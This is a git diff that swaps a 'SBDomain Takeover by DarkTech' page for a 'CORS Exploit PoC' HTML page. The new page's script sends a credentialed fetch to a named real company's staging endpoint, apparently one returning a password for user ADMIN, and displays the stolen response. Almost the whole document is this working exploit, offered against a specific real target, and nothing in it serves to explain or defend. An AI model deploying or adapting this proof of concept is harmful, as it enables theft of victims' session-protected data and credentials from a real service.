@@ -1,9 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SBDomain Takeover by DarkTech</title>
+  <title>CORS Exploit PoC</title>
 </head>
 <body>
-    <h1>SBDomain Takeover by DarkTech</h1>
+  <h2>CORS Exploit Demo</h2>
+  <div id="output">Waiting for response...</div>
+
+  <script>
+    var targetUrl = "https://appdevelopers-stg.t-mobile.com/user/password?name=ADMIN";
+
+    fetch(targetUrl, {
+      method: "GET",
+      credentials: "include" // include victim's cookies/session
+    })
+    .then(response => response.text())
+    .then(data => {
+      document.getElementById("output").innerText =
+        "Extracted sensitive response:\n\n" + data;
+    })
+    .catch(error => {
+      document.getElementById("output").innerText =
+        "Exploit failed: " + error;
+    });
+  </script>
 </body>
 </html>
